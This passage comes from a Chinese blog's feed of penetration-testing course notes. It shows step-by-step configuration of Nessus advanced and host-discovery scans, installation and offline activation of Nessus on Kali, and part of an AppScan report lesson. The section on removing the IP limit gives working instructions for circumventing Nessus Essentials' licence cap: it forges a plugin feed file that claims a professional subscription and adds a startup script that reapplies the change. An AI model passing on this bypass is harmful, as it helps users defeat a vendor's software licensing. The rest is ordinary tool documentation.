alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/24nessus-lou-dong-sao-miao/di-3-jie-nessus-gao-ji-sao-miao/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/24nessus-lou-dong-sao-miao/di-3-jie-nessus-gao-ji-sao-miao/</url>
      
        <content type="html"><![CDATA[<h1 id="nessus高级扫描"><a href="#nessus高级扫描" class="headerlink" title="nessus高级扫描"></a>nessus高级扫描</h1><p>1.启动nessus</p><pre class="line-numbers language-none"><code class="language-none">cd nessussh qd_nessus.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2.进入nessus网站，点击【new Scan】</p><pre class="line-numbers language-none"><code class="language-none">https://kaliip:8834/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/2c2ffafb93224ebc93afafe4e60205a6.png" alt="image.png"></p><p>3.选择【adVanced Scan】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/4b0472b99dad4eeaa167296afbe686f6.png" alt="image.png"></p><p>4.输入Name【高级扫描】，Description【高级扫描】，Targets【需要扫描的ip】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/fa67076b941a4560931eff0d7e6402dd.png" alt="image.png"></p><p>5.点击【 Schedule】</p><p>这里是配置定时任务的，可以忽略</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/9ddf0e54c7e84387b0f01d53eee31e1c.png" alt="image.png"></p><p>6.点击【 Notifications】</p><p>这里主要是配置邮件提醒的，可以配置也可以忽略</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/ae35754b03ed48659a0f1532fa3ba68d.png" alt="image.png"></p><p>7.点击【Discovery 】，点击【主机发现】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/22517e11d91146c588f52f474972889e.png" alt="image.png"></p><p>8.点击【Port Scanning】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/0d89b04664654f7da3b03400675244f7.png" alt="image.png"></p><p>9.点击【Service Discovery】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/aa6a279e953b4fab8b7e2bc86c73d61d.png" alt="image.png"></p><p>10.点击【ASSESSMENT】，点击【general】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/6c0868e2b7b5431db222a8730137c0bd.png" alt="image.png"></p><p>11.点击【Brute Force】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/ca890cc0fcf3413cbfcb5e37dccd2a75.png" alt="image.png"></p><p>12.点击【SCADA】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/4d068852466b4a5c8cfa60c1e467d760.png" alt="image.png"></p><p>13.点击【Web Application Settings】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/443875aa60784a0ba4ac9474f669b447.png" alt="image.png"></p><p>14.点击【Windows】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/2da89cbf88494f2c89117281bf7f5a06.png" alt="image.png"></p><p>15.点击【Malware 】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/ffbdf0e4f0d1405fb4c0f300b4dce573.png" alt="image.png"></p><p>16.点击【Database】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/ba1e37e085ae49b384488d7dd7b02bf2.png" alt="image.png"></p><p>17.点击[REPORT]</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/e70c22e594534560812685745ecd861a.png" alt="image.png"></p><p>18.点击【ADVANCED】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/4991e91caf0c4fbdb5c4685c66553cd3.png" alt="image.png"></p><p>19.点击【Credentials 】，选则【windows】，输入账户密码（必须输入）</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/5a3dea619e0443c39bfcf3998aeb3fcb.png" alt="image.png"></p><p>20.点击【Plugins】</p><p>所有的扫描服务，都是由插件提供的</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/b5c28355b94a47e2bcd739c7805c18ee.png" alt="image.png"></p><p>21.点击【Save】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/10b06f0b62794a5684b16d25be5fda52.png" alt="image.png"></p><p>22.点击【高级扫描】，点击【More】，点击【Launch】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/c32b8e2986a94c41825952aa9b5556fb.png" alt="image.png"></p><p>23.点击【Launch】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/67c1160a61ed4f4888885028f23f80d9.png" alt="image.png"></p><p>24.点击【高级扫描】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/d5ba69b703904698b6b1d338255f2563.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/2ee335411d2741738f14131e5794d87e.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/5ee2d857b1af45edbf67f3e7e865b302.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647417209063/e6a0d4b88eb548fa8deeafc16922ddcd.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/24nessus-lou-dong-sao-miao/di-2-jie-nessus-host-discovery/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/24nessus-lou-dong-sao-miao/di-2-jie-nessus-host-discovery/</url>
      
        <content type="html"><![CDATA[<h1 id="Nessus-Host-Discovery"><a href="#Nessus-Host-Discovery" class="headerlink" title="Nessus Host Discovery"></a>Nessus Host Discovery</h1><p>1.启动nessus</p><pre class="line-numbers language-none"><code class="language-none">sh /root/nessus/qd_nessus.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.进入nessus网站</p><pre class="line-numbers language-none"><code class="language-none">https://192.168.70.3:8834/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/7ab2d5aa1c7a436d9a4236390971d873.png" alt="image.png"></p><p>3.点击【New Scan】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/ae91d3e49a014ce4bf5d16e14d4c009a.png" alt="image.png"></p><p>4.选择【Host Discovery】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/6314833fd6b24fc482bbf884bdeb3bd4.png" alt="image.png"></p><p>5.输入name【主机发现】，Description【主机发现】，Targets【192.168.70.0/24】,点击【Save】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/9af5119ff47a41ef9f14fc1edd751799.png" alt="image.png"></p><p>6.点击【 Schedule】</p><p>这里是配置定时任务的，可以忽略</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/32d9e17742fa4afb8942d1cf5db96ba6.png" alt="image.png"></p><p>7.点击【 Notifications】</p><p>这里主要是配置邮件提醒的，可以配置也可以忽略</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/c65ec8c79ceb4e16a91630ce6bfcddf5.png" alt="image.png"></p><p>8.点击【Discovery 】</p><p>这里选择常用端口扫描</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/7c9a0ee9cc2b48bfa166e80f991819c5.png" alt="image.png"></p><p>9.点击【Report 】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/a768bfa493014b299c4cf4aca1346474.png" alt="image.png"></p><p>10.点击【Advanced 】</p><p>这里是高级设置选项</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/07171ac22bdb481a97298199b7a36636.png" alt="image.png"></p><p>11.点击【Plugins】</p><p>这里是配置插件的地方，主机发现不要配置插件</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/1b538e5621c64332a3ee06cd862080b0.png" alt="image.png"></p><p>12.点击【保存】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/193ae3a3dbd145b88480bb71deb6e721.png" alt="image.png"></p><p>13.点击【主机发现】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/2fe3b92bf40640bea04bc8ecbb12a487.png" alt="image.png"></p><p>14.点击【More】，点击【Launch】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/7abedbdf5cb94f9faafa11eec2017cca.png" alt="image.png"></p><p>15.点击【Launch】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/bda6368a8f0a48d5a42370ce5a7bf537.png" alt="image.png"></p><p>16.点击【主机发现】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/de021dcff58f431c9ceee57cd0354fae.png" alt="image.png"></p><p>17.查看扫描结果</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/a9678c7f935a4213bfdd401d11ed91ae.png" alt="image.png"></p><p>18.选择其中一个主机查看</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/0a1af822d924498bb1c20ed9a3675b4e.png" alt="image.png"></p><p>19.查看具体的扫描结果</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/c8b48d3a6f4241d6a9be2a6bf3b678e3.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/24nessus-lou-dong-sao-miao/di-1-jie-nessus-jie-shao-yu-an-zhuang/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/24nessus-lou-dong-sao-miao/di-1-jie-nessus-jie-shao-yu-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="Nessus介绍与安装"><a href="#Nessus介绍与安装" class="headerlink" title="Nessus介绍与安装"></a>Nessus介绍与安装</h1><h2 id="1-Nessus简介"><a href="#1-Nessus简介" class="headerlink" title="1.Nessus简介"></a>1.Nessus简介</h2><p>Nessus号称是世界上最流行的漏洞扫描程序，全世界有超过75000个组织在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。Nessus不同于传统的漏洞扫描软件，Nessus可同时在本机或远端上遥控，进行系统的漏洞分析扫描。Nessus也是渗透测试重要工具之一</p><h2 id="2-kali安装Nessus"><a href="#2-kali安装Nessus" class="headerlink" title="2.kali安装Nessus"></a>2.kali安装Nessus</h2><p>1.访问Nessus官网</p><pre class="line-numbers language-none"><code class="language-none">https://www.tenable.com/downloads/nessus<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/1dde7c7b4ec645cba3c61b1e8a5ca73f.png" alt="image.png"></p><p>或者下载课程资料里的安装包【Nessus-10.1.1-debian6_amd64.deb】到kali</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/22505ff746a648c397bf5dc2cef5a7a2.png" alt="image.png"></p><p>2.安装Nessus程序</p><pre class="line-numbers language-none"><code class="language-none">dpkg -i Nessus-10.1.1-debian6_amd64.deb <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/071d1f15c17c42f381975763adf711d0.png" alt="image.png"></p><p>You can start Nessus Scanner by typing /bin/systemctl start nessusd.service 启动服务命令</p><p>Then go to <a href="https://kali:8834/">https://kali:8834/</a> to configure your scanner  访问地址</p><p>3.启动Nessus</p><pre class="line-numbers language-none"><code class="language-none">service nessusd start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.查看kali的ip</p><pre class="line-numbers language-none"><code class="language-none">ip a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/f892a26fccf8481fa9f5f687c26c1a58.png" alt="image.png"></p><p>5.浏览器访问nessus的web网站</p><pre class="line-numbers language-none"><code class="language-none">https://192.168.70.3:8834/#/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/d7e0366737ee4e91b5e16b403792ae4b.png" alt="image.png"></p><p>6.选择 【Managed Scanner】选项，点击【Continue】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/f8c1d51f75694259b6a4cd4ce504dfea.png" alt="image.png"></p><p>7.选择【Tenable.sc】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/80ba631a892e4a089673aedb0df08804.png" alt="image.png"></p><p>8.点击【Continue】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/3f4f08d4a8544277ae02f174a8e62ecc.png" alt="image.png"></p><p>9.输入用户名【admin】，输入密码【123456】，点击【Submit】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/8021cf24bd45404eaeba0b0fae793bd5.png" alt="image.png"></p><p>10.等待配置插件</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/86313f9a1137476c8a1a0d023c89069b.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/565d98fe895c431eb8504e1814f9403d.png" alt="image.png"></p><p>安装完成后是这样的界面,尚未激活,不能扫描,此时只有一个设置按钮,并无扫描按钮.</p><h2 id="3-离线激活Nessus"><a href="#3-离线激活Nessus" class="headerlink" title="3.离线激活Nessus"></a>3.离线激活Nessus</h2><ol><li>去nessus官方申请激活码，姓名随便填，邮箱必须正确，用来接收激活码</li></ol><pre class="line-numbers language-none"><code class="language-none">https://zh-cn.tenable.com/products/nessus/nessus-essentials<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/2e042a1b3bc24ebe96668f68b6ccd487.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/b89303b62eee43bc99b9d7c3739212f2.png" alt="image.png"></p><p>2.进入填写的邮箱获取激活码</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/9b2d9202c94c4da080936d485a3c2c83.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/24bf49a1d16e4261a1d30d92ec805d5b.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">D2ZV-D7UM-M75X-E4A3-HAVL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.获得质询码（challenge code）</p><pre class="line-numbers language-none"><code class="language-none">/opt/nessus/sbin/nessuscli fetch  --challenge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/97008ee858754d229d82981cc26b7a62.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">7ae75a7a1eadd542fbc17e4a4c0ad8a95de94da1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.获取离线插件包地址及激活证书</p><p>浏览器打开网页 <a href="https://plugins.nessus.org/v2/offline.php">https://plugins.nessus.org/v2/offline.php</a> ，输入申请的激活码，以及上一步得到的质询码，点击【Submit】</p><pre class="line-numbers language-none"><code class="language-none">https://plugins.nessus.org/v2/offline.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/dad3f4a3b1804e7e88742ace5246b2f2.png" alt="image.png"></p><p>5.得到更新插件地址，及license证书</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/c2f6d9b61f25438c838edc005ac099cc.png" alt="image.png"></p><p>6.下载更新包，下载证书nessus.license。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/045c0b7dccda4006a172bbe12979e312.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/9788ef99b5ce4621ae1e644285f43ed2.png" alt="image.png"></p><p>7.将下载好的激活证书和插件包复制到kali</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/4f9d3d443be24573a4e003cdad62294d.png" alt="image.png"></p><p>8.离线激活nessus</p><pre class="line-numbers language-none"><code class="language-none">/opt/nessus/sbin/nessuscli fetch --register-offline ./nessus.license<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/4da74bfab4124d49824c08fabcfbb02f.png" alt="image.png"></p><p>您的激活码已正确注册-谢谢。</p><p>9.安装插件包</p><pre class="line-numbers language-none"><code class="language-none">/opt/nessus/sbin/nessuscli update ./all-2.0.tar.gz/opt/nessus/lib/nessus/plugins/  #插件包目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/3602dbf8e98c41b08e2698986e81f194.png" alt="image.png"></p><p>10.重启nessus</p><pre class="line-numbers language-none"><code class="language-none">service nessusd restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/2f8e50f756dd4a4797a7e0f9bc2213fa.png" alt="image.png"></p><p>11.重新访问nessus网站，等待加载插件【耗时较长,需要耐心等待】</p><pre class="line-numbers language-none"><code class="language-none">https://192.168.70.3:8834/#/settings/about<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/9b16c2d94b5d4440b025297ec1f9b6f5.png" alt="image.png"></p><p>完成后进入nessus系统。显示激活成功，具有了scan功能。但显示仅允许扫描16个IP。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/b2def339468746fdbd114bed1f43d1d3.png" alt="image.png"></p><h2 id="4-解除IP限制"><a href="#4-解除IP限制" class="headerlink" title="4.解除IP限制"></a>4.解除IP限制</h2><p>1.获取当前plugins的版本。</p><pre class="line-numbers language-none"><code class="language-none">https://plugins.nessus.org/v2/plugins.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/3032df10296340a5bcba5e1d51445822.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">202212100752<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.停止nessus服务</p><pre class="line-numbers language-none"><code class="language-none">service nessusd stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.创建 plugin_feed_info.inc</p><pre class="line-numbers language-none"><code class="language-none">vi plugin_feed_info.inc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>内容如下，并将刚刚获取到的版本号替换如下内容中的数字串。</p><pre class="line-numbers language-none"><code class="language-none">PLUGIN_SET = "202212100752";PLUGIN_FEED = "ProfessionalFeed (Direct)";PLUGIN_FEED_TRANSPORT = "Tenable Network Security Lightning";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>4.将plugin_feed_info.inc替换到 /opt/nessus/var/nessus/plugin_feed_info.inc</p><pre class="line-numbers language-none"><code class="language-none">cp plugin_feed_info.inc /opt/nessus/var/nessus/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5.将 /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc 文件删除。</p><pre class="line-numbers language-none"><code class="language-none">rm -rf /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6.启动nessus服务</p><pre class="line-numbers language-none"><code class="language-none">service nessusd start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7.访问Nessus，windows打开浏览器，访问nessus，会看到nessus初始化插件，完成后，看设置页面显示 unlimited。表示解除IP限制成功。</p><pre class="line-numbers language-none"><code class="language-none">https://192.168.3.47:8834/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/be568c6057e74ea59f2f4a61bbad1fd2.png" alt="image.png"></p><h2 id="5-解决Nessus重启失效后遗症"><a href="#5-解决Nessus重启失效后遗症" class="headerlink" title="5.解决Nessus重启失效后遗症"></a>5.解决Nessus重启失效后遗症</h2><p>由于Nessus服务每次重启后，都会重置plugin_feed_info.inc，这将会使nessus/plugins目录下所有的插件都被删除，无法扫描。因此要将nessus服务设置为手动，并且先停止nessus服务。可以写成批处理解决此问题</p><p>1.编写启动脚本</p><pre class="line-numbers language-none"><code class="language-none">vi qd_nessus.shservice nessusd stop;cp /root/nessus/plugin_feed_info.inc /opt/nessus/var/nessus/;rm -rf /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc;service nessusd start;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每次需要启动nessus时 输入启动命令</p><pre class="line-numbers language-none"><code class="language-none">sh /root/nessus/qd_nessus.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.nessus命令合集</p><pre class="line-numbers language-none"><code class="language-none">#启动service nessusd start;#重启service nessusd restart;#查看状态service nessusd status#停止服务service nessusd stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3.遇到的坑及相应的解决办法</p><p>在解除ip限制的过程中，如果已经解除成功，但是新建扫描项目时，发现很快就结束，无扫描结果。此时查看plugins目录内容是否被删除。</p><pre class="line-numbers language-none"><code class="language-none">du -h /opt/nessus/lib/nessus/plugins<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/e89f232f79234dfabfe2419db15ac273.png" alt="image.png"></p><p>正常情况下，该目录应该在1.4G左右。如远远低于此数值。请按如下步骤操作：</p><pre class="line-numbers language-none"><code class="language-none">service nessusd stop;/opt/nessus/sbin/nessuscli update ./all-2.0.tar.gzsh qd_nessus.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后打开浏览器，正常访问nessus。（<a href="https://192.168.70.3:8843）静待plugins更新完成。">https://192.168.70.3:8843）静待plugins更新完成。</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/23appscan-lou-dong-sao-miao/di-6-jie-appscan-sao-miao-bao-gao/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/23appscan-lou-dong-sao-miao/di-6-jie-appscan-sao-miao-bao-gao/</url>
      
        <content type="html"><![CDATA[<h1 id="第六节-AppScan扫描报告"><a href="#第六节-AppScan扫描报告" class="headerlink" title="第六节-AppScan扫描报告"></a>第六节-AppScan扫描报告</h1><h2 id="1-加载扫描结果"><a href="#1-加载扫描结果" class="headerlink" title="1.加载扫描结果"></a>1.加载扫描结果</h2><p>1.点击【打开】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/6113b3be3e3f4823b6e8a3299a4168b2.png" alt="image.png"></p><p>2.选择之前保存过的扫描结果</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/5a5205ed79b54851b4d2ab9b00e3b94e.png" alt="image.png"></p><p>3.等待加载完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/4cdd51d08f5c48188c7a4c76a2a1af52.png" alt="image.png"></p><h2 id="2-领导查看的报告"><a href="#2-领导查看的报告" class="headerlink" title="2.领导查看的报告"></a>2.领导查看的报告</h2><p>1.点击【报告】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/147bde4944b941558a599f08ff29cdde.png" alt="image.png"></p><p>2.模板选择为【缺省值】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/fda3f723caab4dabb81cee31211c0197.png" alt="image.png"></p><p>3.最低严重性选择为【中】，测试类型选择为【应用程序】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/9c78640cace24a498a841f9cb43410bd.png" alt="image.png"></p><p>4.点击【布局】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/e41b7307149b430eb2606f0cee651a84.png" alt="image.png"></p><p>5.选择【其他徽标】，点击上传徽标</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/df41332deeca4243bd9a9f2b098c50e3.png" alt="image.png"></p><p>6.选择徽标，点击打开</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/58c0f0878dd4457bbf97c1ca6fbfae45.png" alt="image.png"></p><p>7.修改报告标题，比如输入 【哔哩嘀哩网站安全评估报告】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/c9709b41eff441cab81b66b982fa958a.png" alt="image.png"></p><p>8.点击【保存报告】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/4a4c6ce4f8b44483be607691b1ca8dc1.png" alt="image.png"></p><p>9.选择喜欢的位置保存</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/59d25ea09c1b46169c0a3a6258711bbd.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/2de43fdea3194cd5ac62997e1dc5edaf.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/f0c77212eb8e4e828585f795344b6ab9.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/fa4e3bd17c6743f994862de41f0e87eb.png" alt="image.png"></p><h2 id="3-其他报告"><a href="#3-其他报告" class="headerlink" title="3.其他报告"></a>3.其他报告</h2><p>1.行业标准报告</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/5c7340c0a26f498cbcf4a9feb30a8b65.png" alt="image.png"></p><p>2.合规一致性报告</p><p><img 